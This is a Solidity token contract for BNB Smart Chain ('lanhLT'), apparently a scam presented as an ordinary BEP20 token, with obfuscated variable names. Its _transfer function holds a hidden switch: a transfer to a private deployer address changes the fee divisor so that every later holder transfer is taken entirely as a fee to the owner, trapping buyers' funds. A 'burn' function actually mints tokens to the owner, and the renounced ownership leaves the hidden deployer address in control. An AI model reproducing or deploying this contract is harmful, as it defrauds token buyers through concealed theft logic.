/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 14:25:00 GMT
 */
pragma solidity >=0.4.11;
contract NxTHEO {
uint256 public  rvHncm = 100000000000000000000000;
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  vBhxic = 10000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  yYqkBS = address(0);
address public  RkVTjT = address(0);
address private  QqWDnp = address(0);
uint256 public  vXHNqH = 100000000000000000000;
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "lanhLT";
uint256 public  JBgxIq = 10000000000000000000;
address public  OGJlVK = address(0);
address public  PBGctD = address(0);
uint256 public  meCpDM = 100000000000000000;
uint256 public  TayqwK = 100000000000000000000000;
uint256 private  DXJUBt = 10000000000000;
uint256 public  QKYjIR = 10000000000000000;
uint256 public  cMageh = 1000000000000000000;
address public  DRrADE = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  mvHRbB = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
string public  symbol = "TBzaEP";
uint256 public constant KpJZVz = 9+1;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
QqWDnp = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "rdnwjK");
require(to != address(0), "rdnwjK");
require(amount <= balanceOf[from], "rdnwjK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KpJZVz/DXJUBt ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QqWDnp){
DXJUBt = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}